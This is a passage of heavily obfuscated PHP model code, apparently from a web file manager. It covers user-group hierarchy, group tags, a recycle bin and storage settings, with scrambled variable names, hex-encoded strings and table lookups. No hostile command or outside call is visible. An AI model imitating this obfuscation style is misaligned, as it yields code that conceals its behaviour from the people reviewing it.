array_remove_key($şšŸ¯ï, $ó»­Â·ô[590]); foreach ($¡äàÊœÍ as &$§ŒÆşŸ) { $§ŒÆşŸ[$ó»­Â·ô[100]] = $şšŸ¯ï[$§ŒÆşŸ[$ó»­Â·ô[1445]]] ? $şšŸ¯ï[$§ŒÆşŸ[$ó»­Â·ô[1445]]] : array(); } unset($§ŒÆşŸ); } protected function groupMerge($„éï­Ë²) { $„éï­Ë² = array_values(array_unique($„éï­Ë²)); $‚ûûó¾ = array(); for ($„ˆú‹¯ = 0; $„ˆú‹¯ < count($„éï­Ë²); $„ˆú‹¯++) { $ñ‚ë°®ş = !1; for ($éœè×¸º = 0; $éœè×¸º < count($„éï­Ë²); $éœè×¸º++) { if ($„ˆú‹¯ == $éœè×¸º) { continue; } if ($this->isParentOf($„éï­Ë²[$éœè×¸º], $„éï­Ë²[$„ˆú‹¯])) { $ñ‚ë°®ş = !0; break; } } if (!$ñ‚ë°®ş) { $‚ûûó¾[] = $„éï­Ë²[$„ˆú‹¯]; } } return $‚ûûó¾; } protected function isParentOf($ó¢Ú¥ ø, $®¶ óêé) { $ôŞÕæ«Œ =& $_SERVER[¬ÏÕ§Áú]; if (!$ó¢Ú¥ ø || !$®¶ óêé || $ó¢Ú¥ ø == $®¶ óêé) { return !1; } $ÛïŠÏ”Á = $this->getInfoSimple($ó¢Ú¥ ø); $Àß¾â‚Ä = $this->getInfoSimple($®¶ óêé); $á©Š±¤Ê = $ÛïŠÏ”Á[$ôŞÕæ«Œ[605]] . $ó¢Ú¥ ø . $ôŞÕæ«Œ[50]; if (substr($Àß¾â‚Ä[$ôŞÕæ«Œ[605]], 0, strlen($á©Š±¤Ê)) == $á©Š±¤Ê) { return !0; } return !1; } public function groupShowRoot($¢ÈàŞ», $†›Ü¥‹İ = false) { $ğËœ×Ú‘ =& $_SERVER[¬ÏÕ§Áú]; $Öñ½ÄÕî = $this->getInfo($¢ÈàŞ»); if (!$Öñ½ÄÕî) { return array(); } $¯ˆËê™ = $this->parentLevelArray($Öñ½ÄÕî[$ğËœ×Ú‘[605]]); $ÕÒÊìË = array($¢ÈàŞ»); if (count($¯ˆËê™) == 0) { return $ÕÒÊìË; } if ($†›Ü¥‹İ && count($¯ˆËê™) == 1) { return $ÕÒÊìË; } if (!$Öñ½ÄÕî[$ğËœ×Ú‘[560]] || !isset($Öñ½ÄÕî[$ğËœ×Ú‘[560]][$ğËœ×Ú‘[2127]]) || $Öñ½ÄÕî[$ğËœ×Ú‘[560]][$ğËœ×Ú‘[2127]] == $ğËœ×Ú‘[892]) { return $this->groupShowRoot($¯ˆËê™[count($¯ˆËê™) - 1], $†›Ü¥‹İ); } if ($Öñ½ÄÕî[$ğËœ×Ú‘[560]][$ğËœ×Ú‘[2127]] == $ğËœ×Ú‘[443]) { $×¾î˜¬ö = explode($ğËœ×Ú‘[50], $Öñ½ÄÕî[$ğËœ×Ú‘[560]][$ğËœ×Ú‘[2128]]); if ($×¾î˜¬ö) { $ÕÒÊìË = array_merge($ÕÒÊìË, $×¾î˜¬ö); } } return $ÕÒÊìË; } protected function resetParentLevel() { $ºÑ¦¥¡Û =& $_SERVER[¬ÏÕ§Áú]; $ƒïíì©¦ = $ºÑ¦¥¡Û[1445]; $ƒö˜‡ûÅ = $this->select(); $ƒö˜‡ûÅ = array_to_keyvalue($ƒö˜‡ûÅ, $ƒïíì©¦); foreach ($ƒö˜‡ûÅ as $ëç¤üù›) { $Ã·÷µŸê = $ëç¤üù›; $îş÷€›¾ = array(); while ($Ã·÷µŸê[$ºÑ¦¥¡Û[203]] != 0) { $îş÷€›¾[] = $Ã·÷µŸê[$ºÑ¦¥¡Û[203]]; $Ã·÷µŸê = $ƒö˜‡ûÅ[$Ã·÷µŸê[$ºÑ¦¥¡Û[203]]]; } $îş÷€›¾[] = 0; $îş÷€›¾ = $ºÑ¦¥¡Û[50] . implode($ºÑ¦¥¡Û[50], array_reverse($îş÷€›¾)) . $ºÑ¦¥¡Û[50]; $this->setNamePinyin($ëç¤üù›[$ƒïíì©¦], $ëç¤üù›[$ºÑ¦¥¡Û[32]]); $this->where(array($ƒïíì©¦ => $ëç¤üù›[$ƒïíì©¦]))->save(array($ºÑ¦¥¡Û[676] => $îş÷€›¾)); } return $ƒö˜‡ûÅ; } public function groupNameAuto($ÚÃè†Âğ, $íÚÌŸ½¡) { $ßìÄàŒ« =& $_SERVER[¬ÏÕ§Áú]; $Ïêù = $this->where(array($ßìÄàŒ«[497] => $ÚÃè†Âğ))->getField($ßìÄàŒ«[32], !0); if (!$Ïêù || !in_array($íÚÌŸ½¡, $Ïêù)) { return $íÚÌŸ½¡; } for ($ÁüçÓÓ« = 1; $ÁüçÓÓ« <= count($Ïêù) + 1; $ÁüçÓÓ«++) { $Àî†˜ğ  = $íÚÌŸ½¡ . "\50{$ÁüçÓÓ«}\51"; if (!in_array($Àî†˜ğ , $Ïêù)) { return $Àî†˜ğ ; } } } public function groupSwitch($½–üğŸ, $±ÆÓ‘§‹) { $³§íúÇ½ =& $_SERVER[¬ÏÕ§Áú]; $œ±®¶¾ã = array($³§íúÇ½[1445] => array($³§íúÇ½[7], array($½–üğŸ, $±ÆÓ‘§‹))); $›í´²°é = $this->where($œ±®¶¾ã)->select(); $›í´²°é = array_to_keyvalue($›í´²°é, $³§íúÇ½[1445]); $¦Ü„ãÎ³ = _get($›í´²°é, $½–üğŸ); $Àò«ÌÉ = _get($›í´²°é, $±ÆÓ‘§‹); if (!$¦Ü„ãÎ³ || !$Àò«ÌÉ || $¦Ü„ãÎ³[$³§íúÇ½[203]] == 0) { return !1; } if ($¦Ü„ãÎ³[$³§íúÇ½[1445]] == $Àò«ÌÉ[$³§íúÇ½[1445]]) { return !1; } if (strpos($Àò«ÌÉ[$³§íúÇ½[605]], $¦Ü„ãÎ³[$³§íúÇ½[605]] . $¦Ü„ãÎ³[$³§íúÇ½[1445]] . $³§íúÇ½[50]) === 0) { return !1; } $œ±®¶¾ã = array($³§íúÇ½[1445] => $½–üğŸ); $†“†Î± = Model($³§íúÇ½[2131])->where($œ±®¶¾ã)->select(); if (!$†“†Î±) { $†“†Î± = array(); } foreach ($†“†Î± as $®‰ÎÑ ë) { $ˆëªŠïË = $®‰ÎÑ ë[$³§íúÇ½[1837]]; $œ±®¶¾ã = array($³§íúÇ½[1837] => $ˆëªŠïË, $³§íúÇ½[1445] => $±ÆÓ‘§‹); $”Ìëä•â = Model($³§íúÇ½[2131])->where($œ±®¶¾ã)->find(); if (!$”Ìëä•â) { $øÑ‹ò¡Ñ = array($±ÆÓ‘§‹ => $®‰ÎÑ ë[$³§íúÇ½[2145]]); Model($³§íúÇ½[618])->userGroupAdd($ˆëªŠïË, $øÑ‹ò¡Ñ); } Model($³§íúÇ½[618])->userGroupRemove($ˆëªŠïË, $½–üğŸ); } $œ±®¶¾ã = array($³§íúÇ½[201] => 2, $³§íúÇ½[203] => 0, $³§íúÇ½[505] => 1, $³§íúÇ½[590] => array($³§íúÇ½[7], array($½–üğŸ, $±ÆÓ‘§‹))); $œĞ¨Éö = Model($³§íúÇ½[946])->where($œ±®¶¾ã)->field($³§íúÇ½[2146])->select(); $œĞ¨Éö = array_to_keyvalue($œĞ¨Éö, $³§íúÇ½[590], $³§íúÇ½[204]); $½šğâ…è = !empty($œĞ¨Éö[$½–üğŸ]) ? $œĞ¨Éö[$½–üğŸ] : !1; if ($½šğâ…è) { if (!$œĞ¨Éö[$±ÆÓ‘§‹]) { $œĞ¨Éö[$±ÆÓ‘§‹] = Model($³§íúÇ½[946])->groupRootAdd($±ÆÓ‘§‹); } $ƒĞ‚­şà = $œĞ¨Éö[$±ÆÓ‘§‹]; $œ±®¶¾ã = array($³§íúÇ½[203] => $½šğâ…è); $œĞ¨Éö = Model($³§íúÇ½[946])->where($œ±®¶¾ã)->field($³§íúÇ½[2147])->select(); if (!$œĞ¨Éö) { $œĞ¨Éö = array(); } Model($³§íúÇ½[946])->moveClearAuth = !1; foreach ($œĞ¨Éö as $øÁ¿€º) { $½ğº”§Ï = $øÁ¿€º[$³§íúÇ½[505]] == $³§íúÇ½[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($³§íúÇ½[946])->move($øÁ¿€º[$³§íúÇ½[204]], $ƒĞ‚­şà, $½ğº”§Ï); } Model($³§íúÇ½[946])->moveClearAuth = !0; $œ±®¶¾ã = array($³§íúÇ½[201] => 2, $³§íúÇ½[590] => $½–üğŸ); $àå ÊÅ = array($³§íúÇ½[590] => $±ÆÓ‘§‹); Model($³§íúÇ½[2148])->where($œ±®¶¾ã)->save($àå ÊÅ); Model($³§íúÇ½[2149])->where($œ±®¶¾ã)->save($àå ÊÅ); } $this->_changeChildLevel($›í´²°é[$½–üğŸ], $›í´²°é[$±ÆÓ‘§‹], !0); $this->where(array($³§íúÇ½[203] => $½–üğŸ))->save(array($³§íúÇ½[203] => $±ÆÓ‘§‹)); $this->_clearChildrenCache($›í´²°é[$±ÆÓ‘§‹]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($Ñ‡¤ó€È) { $¡şÃŸáã =& $_SERVER[¬ÏÕ§Áú]; return array($¡şÃŸáã[2150] => array($Ñ‡¤ó€È[0], $¡şÃŸáã[2151]), $¡şÃŸáã[2152] => array($Ñ‡¤ó€È[0], $¡şÃŸáã[2153])); } protected function get($²şÕŒÄä) { $¾ÙÎ ™ =& $_SERVER[¬ÏÕ§Áú]; $ïüïá—¡ = Model($¾ÙÎ ™[606])->metaGet($²şÕŒÄä, $¾ÙÎ ™[2154]); $÷ÄÂ‹â = json_decode($ïüïá—¡, !0); return $÷ÄÂ‹â ? $÷ÄÂ‹â : array($¾ÙÎ ™[2155] => $¾ÙÎ ™[101], $¾ÙÎ ™[456] => array()); } protected function set($ĞˆÛ‘ş, $ßóÔ…µ) { $¨ş”ªÛÂ =& $_SERVER[¬ÏÕ§Áú]; $ßóÔ…µ = $ßóÔ…µ ? $ßóÔ…µ : array($¨ş”ªÛÂ[2155] => $¨ş”ªÛÂ[101], $¨ş”ªÛÂ[456] => array()); return Model($¨ş”ªÛÂ[606])->metaSet($ĞˆÛ‘ş, $¨ş”ªÛÂ[2154], json_encode($ßóÔ…µ)); } protected function getByTagID($ïÓŠñòÔ, $àÜé©¬ˆ) { $¬úÏ©ï =& $_SERVER[¬ÏÕ§Áú]; if (!$ïÓŠñòÔ || !$àÜé©¬ˆ) { return !1; } if (!Model($¬úÏ©ï[606])->getInfoSimple($ïÓŠñòÔ)) { return !1; } $«à••ŠÔ = $this->get($ïÓŠñòÔ); if (!$«à••ŠÔ || !isset($«à••ŠÔ[$¬úÏ©ï[456]])) { return !1; } $ê¡¼ÌĞØ = array_find_by_field($«à••ŠÔ[$¬úÏ©ï[456]], $¬úÏ©ï[492], $àÜé©¬ˆ); return is_array($ê¡¼ÌĞØ) ? $ê¡¼ÌĞØ : !1; } public function listSource($÷£Å¿Á, $Óå´ù³Ó) { $È“à…¸ =& $_SERVER[¬ÏÕ§Áú]; if ($Óå´ù³Ó && !is_array($Óå´ù³Ó)) { $Óå´ù³Ó = array($Óå´ù³Ó); } $ßš¯ÃË† = $this->listData($÷£Å¿Á); $È³¬Ø¿» = array(); foreach ($ßš¯ÃË† as $„ÙŸĞª”) { $ïÅ®¨† = $„ÙŸĞª”[$È“à…¸[97]]; if (!$ïÅ®¨†) { continue; } if (!isset($È³¬Ø¿»[$ïÅ®¨†])) { $È³¬Ø¿»[$ïÅ®¨†] = array(); } $È³¬Ø¿»[$ïÅ®¨†][] = $„ÙŸĞª”[$È“à…¸[520]]; } $ÇúàäÇ— = array(); foreach ($È³¬Ø¿» as $–ŸÈ™× => $º§‡ÃßÉ) { $è™ßÜ‡ = !0; if (!$Óå´ù³Ó) { $ÇúàäÇ—[] = $–ŸÈ™×; continue; } foreach ($Óå´ù³Ó as $ Û’­í±) { if (!in_array($ Û’­í±, $º§‡ÃßÉ)) { $è™ßÜ‡ = !1; break; } } if ($è™ßÜ‡) { $ÇúàäÇ—[] = $–ŸÈ™×; } } if (!$ÇúàäÇ—) { return array(); } $¦ì–ùó– = array($È“à…¸[511] => array($È“à…¸[512], $ÇúàäÇ—), $È“à…¸[590] => $÷£Å¿Á, $È“à…¸[201] => SourceModel::TYPE_GROUP); $¬¼â›ÕÃ = Model($È“à…¸[1483])->listSource($¦ì–ùó–); if (!$¬¼â›ÕÃ || count($ÇúàäÇ—) == $¬¼â›ÕÃ[$È“à…¸[453]][$È“à…¸[454]]) { return $¬¼â›ÕÃ; } $ôàşœÉ× = array(); $îü­ì‘ö = array_to_keyvalue($¬¼â›ÕÃ[$È“à…¸[95]], $È“à…¸[12], $È“à…¸[204]); $¥›¥÷™ç = array_to_keyvalue($¬¼â›ÕÃ[$È“à…¸[96]], $È“à…¸[12], $È“à…¸[204]); $èµ©¾›Ã = array_merge($¥›¥÷™ç, $îü­ì‘ö); foreach ($ÇúàäÇ— as $ïÅ®¨†) { if (!in_array($ïÅ®¨†, $èµ©¾›Ã)) { $ôàşœÉ×[] = $ïÅ®¨†; } } if ($ôàşœÉ×) { $this->removeBySource($÷£Å¿Á, $ôàşœÉ×); } return $¬¼â›ÕÃ; } protected function listData($õö»®—•) { $šÕ•ú¯æ =& $_SERVER[¬ÏÕ§Áú]; $ç÷ŒÈ•á = array($šÕ•ú¯æ[1828] => 0, $šÕ•ú¯æ[578] => array($šÕ•ú¯æ[2156], 0), $šÕ•ú¯æ[516] => $šÕ•ú¯æ[1441] . $õö»®—•); $ëò‰…´ = $šÕ•ú¯æ[2157]; $®õßµø¢ = $this->field($ëò‰…´)->where($ç÷ŒÈ•á)->order($šÕ•ú¯æ[2158])->select(); return $®õßµø¢ ? $®õßµø¢ : array(); } protected function addToTag($¯ÈÁ“˜, $ó˜æ’Ö, $ëÜšßõ) { $¯Ï§ÁËï =& $_SERVER[¬ÏÕ§Áú]; if (!$this->getByTagID($¯ÈÁ“˜, $ëÜšßõ) || !$ó˜æ’Ö) { return !1; } if (!Model($¯Ï§ÁËï[946])->pathInfo($ó˜æ’Ö)) { return !1; } $Ïö´»” = array($¯Ï§ÁËï[1828] => 0, $¯Ï§ÁËï[578] => $ëÜšßõ, $¯Ï§ÁËï[515] => $ó˜æ’Ö, $¯Ï§ÁËï[516] => $¯Ï§ÁËï[2159] . $¯ÈÁ“˜, $¯Ï§ÁËï[514] => $¯Ï§ÁËï[12], $¯Ï§ÁËï[2041] => 0); if ($this->where($Ïö´»”)->find()) { return !1; } return $this->add($Ïö´»”); } protected function removeFromTag($ÙÈ¨£›Ğ, $§¡ÇÓ‰, $èÍ„á¢) { $©ï¦¿ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->getByTagID($ÙÈ¨£›Ğ, $èÍ„á¢) || !$§¡ÇÓ‰) { return !1; } if (is_array($§¡ÇÓ‰)) { $§¡ÇÓ‰ = array($©ï¦¿[7], $§¡ÇÓ‰); } $«¥ÚØã = array($©ï¦¿[1828] => 0, $©ï¦¿[578] => $èÍ„á¢, $©ï¦¿[516] => $©ï¦¿[2159] . $ÙÈ¨£›Ğ, $©ï¦¿[515] => $§¡ÇÓ‰); return $this->where($«¥ÚØã)->delete(); } protected function removeByTag($¯ä˜³öÖ, $¸íãÏöŒ) { $®¶ ÊÏ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->getByTagID($¯ä˜³öÖ, $¸íãÏöŒ)) { return !1; } $Åö­á§– = array($®¶ ÊÏ[1828] => 0, $®¶ ÊÏ[578] => $¸íãÏöŒ, $®¶ ÊÏ[516] => $®¶ ÊÏ[2159] . $¯ä˜³öÖ); return $this->where($Åö­á§–)->delete(); } protected function removeBySource($áç»œ”¦, $²ı‡ãÍ) { $Ù™ƒ–ˆ =& $_SERVER[¬ÏÕ§Áú]; if (!$áç»œ”¦ || !$²ı‡ãÍ) { return !1; } if (is_array($²ı‡ãÍ)) { $²ı‡ãÍ = array($Ù™ƒ–ˆ[7], $²ı‡ãÍ); } $ªæ¯‡î‘ = array($Ù™ƒ–ˆ[1828] => 0, $Ù™ƒ–ˆ[515] => $²ı‡ãÍ, $Ù™ƒ–ˆ[578] => array($Ù™ƒ–ˆ[1139], 0), $Ù™ƒ–ˆ[516] => $Ù™ƒ–ˆ[2159] . $áç»œ”¦); return $this->where($ªæ¯‡î‘)->delete(); } } goto DŸ”­ÍâÛï; b˜Şí¥ë: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\162\x63\x65\x5f\162\145\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\x54\x69\155\145", "\164\151\x6d\x65", "\151\156\x73\145\162\164", "\146\165\x6e\143\164\x69\157\x6e")); public function listData($º’ÕÇÀ = false) { $ÕÛ¯İÅ¯ =& $_SERVER[¬ÏÕ§Áú]; $º’ÕÇÀ = $º’ÕÇÀ ? $º’ÕÇÀ : USER_ID; $¼Ó ‘× = $this->where(array($ÕÛ¯İÅ¯[1828] => $º’ÕÇÀ))->select(); return array_to_keyvalue($¼Ó ‘×, $ÕÛ¯İÅ¯[12], $ÕÛ¯İÅ¯[204]); } public function moveToRecycle($†Ì°‹Ì¤) { $´™ŞúˆÛ =& $_SERVER[¬ÏÕ§Áú]; $·Ğ®»ÜŸ = Model($´™ŞúˆÛ[1483]); $¯£®Ê¾î = $·Ğ®»ÜŸ->sourceInfo($†Ì°‹Ì¤); if (!$¯£®Ê¾î || $¯£®Ê¾î[$´™ŞúˆÛ[525]] == $´™ŞúˆÛ[101]) { return; } $àÓòİãè = array($´™ŞúˆÛ[511] => $†Ì°‹Ì¤, $´™ŞúˆÛ[1828] => USER_ID, $´™ŞúˆÛ[672] => $¯£®Ê¾î[$´™ŞúˆÛ[201]], $´™ŞúˆÛ[673] => $¯£®Ê¾î[$´™ŞúˆÛ[590]], $´™ŞúˆÛ[676] => $¯£®Ê¾î[$´™ŞúˆÛ[605]]); $this->add($àÓòİãè); $this->recycleMove($†Ì°‹Ì¤, 1); if ($¯£®Ê¾î[$´™ŞúˆÛ[505]] == $´™ŞúˆÛ[101]) { $¼ĞëãÛ¹ = array($´™ŞúˆÛ[676] => array($´™ŞúˆÛ[636], $¯£®Ê¾î[$´™ŞúˆÛ[605]] . $†Ì°‹Ì¤ . $´™ŞúˆÛ[637])); $·Ğ®»ÜŸ->where($¼ĞëãÛ¹)->setField($´™ŞúˆÛ[525], 1); } } public function clear() { $this->remove(!1); } public function remove($°à½—Ìù = false, $ğ¯ÏÄôô = false) { $õ¾¿ëƒ  =& $_SERVER[¬ÏÕ§Áú]; $ğ¯ÏÄôô = $ğ¯ÏÄôô ? $ğ¯ÏÄôô : USER_ID; $¼èøí¤Ø = Model($õ¾¿ëƒ [1483]); $¿Õ˜´‚€ = $this->listData($ğ¯ÏÄôô); $°à½—Ìù = $°à½—Ìù === !1 ? !1 : $°à½—Ìù; $Åö«àß = array(); foreach ($¿Õ˜´‚€ as $µüş–¸) { if ($°à½—Ìù != !1 && !in_array($µüş–¸, $°à½—Ìù)) { continue; } $Ö­„¾ËÈ = $¼èøí¤Ø->sourceInfo($µüş–¸); $¼èøí¤Ø->remove($µüş–¸, !1); $ù—£²Ö¿ = $Ö­„¾ËÈ[$õ¾¿ëƒ [201]] . $õ¾¿ëƒ [11] . $Ö­„¾ËÈ[$õ¾¿ëƒ [590]]; $Åö«àß[$ù—£²Ö¿] = array($õ¾¿ëƒ [672] => $Ö­„¾ËÈ[$õ¾¿ëƒ [201]], $õ¾¿ëƒ [590] => $Ö­„¾ËÈ[$õ¾¿ëƒ [590]]); $this->where(array($õ¾¿ëƒ [204] => $µüş–¸))->delete(); } foreach ($Åö«àß as $ˆ³È¢’) { $¼èøí¤Ø->targetSpaceUpdate($ˆ³È¢’[$õ¾¿ëƒ [201]], $ˆ³È¢’[$õ¾¿ëƒ [590]]); } } public function restore($ÚœÓ“¡ï = false) { $—ÇÕ²ú = $this->listData(); $this->_restoreSource($—ÇÕ²ú, $ÚœÓ“¡ï); } public function removeUserAll($ŠÒåå®÷) { $this->remove(!1, $ŠÒåå®÷); } public function restoreItem($†Àîú„Ø) { $this->_restoreSource(array($†Àîú„Ø), array($†Àîú„Ø)); } private function _restoreSource($úì‘•Š, $Ñòé³ö) { $üã­÷Âó =& $_SERVER[¬ÏÕ§Áú]; $·ëòı = Model($üã­÷Âó[1483]); $Ñòé³ö = $Ñòé³ö == !1 ? !1 : $Ñòé³ö; if (!$úì‘•Š) { return !0; } $…•Øä¤™ = array(); foreach ($úì‘•Š as $‰À†ğÄğ) { if ($Ñòé³ö != !1 && !in_array($‰À†ğÄğ, $Ñòé³ö)) { continue; } $ûß¦‡ê = $·ëòı->sourceInfo($‰À†ğÄğ); $éÃ·ô§— = $·ëòı->sourceInfo($ûß¦‡ê[$üã­÷Âó[203]]); if ($éÃ·ô§—[$üã­÷Âó[525]] == $üã­÷Âó[101]) { continue; } $·ëòı->lockMoveStart($‰À†ğÄğ); $this->recycleMove($‰À†ğÄğ, 0); if ($ûß¦‡ê[$üã­÷Âó[505]] == $üã­÷Âó[101]) { $‰ö™áö = array($üã­÷Âó[676] => array($üã­÷Âó[636], $ûß¦‡ê[$üã­÷Âó[605]] . $‰À†ğÄğ . $üã­÷Âó[637])); $·ëòı->where($‰ö™áö)->setField($üã­÷Âó[525], 0); $this->restoreFolderChildren($‰À†ğÄğ, $úì‘•Š); } $this->where(array($üã­÷Âó[204] => $‰À†ğÄğ))->delete(); $·ëòı->folderSizeReset($ûß¦‡ê[$üã­÷Âó[203]]); $…•Øä¤™[] = $ûß¦‡ê[$üã­÷Âó[203]]; if ($ûß¦‡ê[$üã­÷Âó[505]] == $üã­÷Âó[101]) { $…•Øä¤™[] = $‰À†ğÄğ; } $·ëòı->lockMoveEnd($‰À†ğÄğ); } $·ëòı->updateModifyTime($…•Øä¤™); } private function restoreFolderChildren($»¿éóíŞ, $œ‡ò°ŠÖ) { $­¡‚ôó¡ =& $_SERVER[¬ÏÕ§Áú]; $ºÜ€²­† = Model($­¡‚ôó¡[1483]); $ŠßØïåß = array($­¡‚ôó¡[204] => array($­¡‚ôó¡[7], array())); foreach ($œ‡ò°ŠÖ as $ßÃØº„”) { if ($ßÃØº„” == $»¿éóíŞ) { continue; } if (!$ºÜ€²­†->isParentOf($»¿éóíŞ, $ßÃØº„”)) { continue; } $‰ïÈØí = $ºÜ€²­†->sourceInfo($ßÃØº„”); if ($‰ïÈØí[$­¡‚ôó¡[505]] == $­¡‚ôó¡[101]) { $ŠßØïåß[] = array($­¡‚ôó¡[676] => array($­¡‚ôó¡[636], $‰ïÈØí[$­¡‚ôó¡[605]] . $ßÃØº„” . $­¡‚ôó¡[637])); } else { $ŠßØïåß[$­¡‚ôó¡[204]][1][] = $ßÃØº„”; } } if (!$ŠßØïåß[$­¡‚ôó¡[204]][1]) { unset($ŠßØïåß[$­¡‚ôó¡[204]]); } if (!$ŠßØïåß) { return; } if (is_array($ŠßØïåß[$­¡‚ôó¡[204]]) && is_array($ŠßØïåß[$­¡‚ôó¡[204]][1])) { $ŠßØïåß[$­¡‚ôó¡[204]][1] = array_unique($ŠßØïåß[$­¡‚ôó¡[204]][1]); } $ŠßØïåß[$­¡‚ôó¡[1125]] = $­¡‚ôó¡[2139]; $ºÜ€²­†->where($ŠßØïåß)->setField($­¡‚ôó¡[525], 1); } private function recycleMove($‹®ŸÖ´, $ª™ÁØæ· = 1) { $…ãÊ½ê† =& $_SERVER[¬ÏÕ§Áú]; $åÉ½•á£ = Model($…ãÊ½ê†[1483]); $ÂÀª¼Î = Model($…ãÊ½ê†[2380]); $ƒşÁ¤Ø = array($…ãÊ½ê†[204] => $‹®ŸÖ´); if ($ª™ÁØæ·) { $åÉ½•á£->where($ƒşÁ¤Ø)->setField($…ãÊ½ê†[525], 1); $ÂÀª¼Î->eventRecycle($‹®ŸÖ´, $…ãÊ½ê†[2381]); } else { $³‚«şùª = $åÉ½•á£->where($ƒşÁ¤Ø)->find(); $¢™¸äÍ = $³‚«şùª[$…ãÊ½ê†[505]] == $…ãÊ½ê†[101]; $²™±åôÚ = $åÉ½•á£->fileNameAuto($³‚«şùª[$…ãÊ½ê†[203]], $³‚«şùª[$…ãÊ½ê†[32]], REPEAT_RENAME_FOLDER, $¢™¸äÍ); if ($²™±åôÚ != $³‚«şùª[$…ãÊ½ê†[32]]) { $åÉ½•á£->rename($‹®ŸÖ´, $²™±åôÚ); } $åÉ½•á£->where($ƒşÁ¤Ø)->setField($…ãÊ½ê†[525], 0); $ÂÀª¼Î->eventRecycle($‹®ŸÖ´, $…ãÊ½ê†[2382]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\163\157\x75\162\143\x65\x53\x65\143\162\145\164\114\151\163\x74"; public $field = array("\x73\157\165\162\x63\x65\111\104", "\164\171\160\x65\111\x44", "\x63\x72\145\141\x74\x65\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\x73\x74\x6f\162\141\147\145\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x73\x69\x7a\x65\115\x61\170", "\x73\171\163\164\x65\x6d", "\144\145\x66\x61\165\154\164", "\144\162\x69\166\x65\162", "\x63\157\x6e\x66\x69\x67"); public function listData($°íÒ‡ï“ = false, $¨úÙÔ’· = "\x6d\157\x64\x69\x66\171\124\151\x6d\145", $Àù’ØÀˆ = false) { $øùÊ¶›¢ =& $_SERVER[¬ÏÕ§Áú]; $ØÏÑœ‚é = parent::listData($°íÒ‡ï“, $¨úÙÔ’·, $Àù’ØÀˆ); if ($°íÒ‡ï“) { return $ØÏÑœ‚é; } $¼¢Ìâçë = array(); if ($GLOBALS[$øùÊ¶›¢[2383]]) { $¼¢Ìâçë = $this->ioSizeUseGet(array_to_keyvalue($ØÏÑœ‚é, $øùÊ¶›¢[12], $øùÊ¶›¢[492])); } foreach ($ØÏÑœ‚é as $‰çÎ´Ò› => $àÏ«ùº³) { unset($ØÏÑœ‚é[$‰çÎ´Ò›][$øùÊ¶›¢[6]]); $ØÏÑœ‚é[$‰çÎ´Ò›][$øùÊ¶›¢[2026]] = isset($¼¢Ìâçë[$àÏ«ùº³[$øùÊ¶›¢[492]]]) ? $¼¢Ìâçë[$àÏ«ùº³[$øùÊ¶›¢[492]]] : 0; } return $ØÏÑœ‚é; } public function ioSizeUseGet($œ´–ö¸) { $£¦Ó¨‹» =& $_SERVER[¬ÏÕ§Áú]; if (!$œ´–ö¸) { return array(); } $—©‡°£ß = $£¦Ó¨‹»[2384] . implode($£¦Ó¨‹»[50], $œ´–ö¸); $Öëî€óü = Cache::get($—©‡°£ß); if ($Öëî€óü) { return $Öëî€óü; } $¶„Ç— = array($£¦Ó¨‹»[939] => $£¦Ó¨‹»[492], $£¦Ó¨‹»[2385] => $£¦Ó¨‹»[89]); $÷‘Üï’ = array($£¦Ó¨‹»[939] => array($£¦Ó¨‹»[7], $œ´–ö¸)); $Öëî€óü = Model($£¦Ó¨‹»[907])->field($¶„Ç—)->where($÷‘Üï’)->group($£¦Ó¨‹»[939])->select(); $Öëî€óü = array_to_keyvalue($Öëî€óü, $£¦Ó¨‹»[492], $£¦Ó¨‹»[89]); Cache::set($—©‡°£ß, $Öëî€óü, 600); return $Öëî€óü; } public function getConfig($Ôú›¾ªÓ) { $ ¤½”šÊ = parent::listData($Ôú›¾ªÓ); $¢øãé« = _get($ ¤½”šÊ, $_SERVER[¬ÏÕ§Áú][6], array()); if ($¢øãé« && !is_array($¢øãé«)) { $¢øãé« = json_decode($¢øãé«, !0); } return $¢øãé«; } public function update($ƒíÌ¢—è, $Ï×“áÑ’) { $îŠóÒ½³ =& $_SERVER[¬ÏÕ§Áú]; $Å‹ »‡Ò = $Ï×“áÑ’[$îŠóÒ½³[32]]; $”Ï¬¤í¨ = array_to_keyvalue(parent::listData(), $îŠóÒ½³[32]); if (isset($”Ï¬¤í¨[$Å‹ »‡Ò]) && $”Ï¬¤í¨[$Å‹ »‡Ò][$îŠóÒ½³[492]] != $ƒíÌ¢—è) { return !1; } $this->checkPwd($ƒíÌ¢—è, $Ï×“áÑ’); if (isset($Ï×“áÑ’[$îŠóÒ½³[2386]]) && $Ï×“áÑ’[$îŠóÒ½³[2386]] == $îŠóÒ½³[101]) { $this->checkConfig($Ï×“áÑ’); } unset($Ï×“áÑ’[$îŠóÒ½³[2386]]); $Ü’—ˆº = parent::update($ƒíÌ¢—è, $Ï×“áÑ’); if ($Ü’—ˆº && $Ï×“áÑ’[$îŠóÒ½³[37]]) { foreach ($”Ï¬¤í¨ as $ŞÉ—¥Û“) { if ($ŞÉ—¥Û“[$îŠóÒ½³[37]] && $ŞÉ—¥Û“[$îŠóÒ½³[492]] != $ƒíÌ¢—è) { parent::update($ŞÉ—¥Û“[$îŠóÒ½³[492]], array($îŠóÒ½³[37] => 0)); } } $this->updateBackup($ƒíÌ¢—è, $”Ï¬¤í¨); } return $Ü’—ˆº; } public function add($¡¯³›êö) { $ÌïÁ¤ˆ =& $_SERVER[¬ÏÕ§Áú]; $¯¼Û•ğ› = array_to_keyvalue(parent::listData(), $ÌïÁ¤ˆ[32]); if (isset($¯¼Û•ğ›[$¡¯³›êö[$ÌïÁ¤ˆ[32]]])) { return !1; } $this->checkConfig($¡¯³›êö); $³ô¹ÄÚ£ = parent::insert($¡¯³›êö); if ($³ô¹ÄÚ£ && $¡¯³›êö[$ÌïÁ¤ˆ[37]]) { foreach ($¯¼Û•ğ› as $üÏ•ó­ì) { if ($üÏ•ó­ì[$ÌïÁ¤ˆ[37]]) { 